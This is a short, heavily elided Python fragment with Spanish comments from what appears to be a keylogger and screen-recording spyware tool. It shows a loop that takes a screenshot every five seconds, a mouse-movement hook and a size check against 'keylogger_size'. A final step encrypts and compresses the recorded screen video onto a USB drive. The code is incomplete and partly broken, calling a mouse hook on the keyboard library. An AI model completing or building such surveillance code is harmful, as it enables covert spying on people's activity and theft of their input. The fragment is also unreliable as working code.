...
def record_screenshots():
    ...
    while True:
        ...
        time.sleep(5)  # Esperar 5 segundos para la siguiente captura de pantalla
...
keyboard.on_mouse_move(OnMouseMove)
...
if usb_stats.free > keylogger_size:
    ...
    # Encriptar y comprimir el archivo de video
    encrypted_video_file = os.path.join(usb_path, 'screen_record_encrypted.7z')
    encrypt_and_compress_file('screen_record.mp4', encrypted_video_file, key)
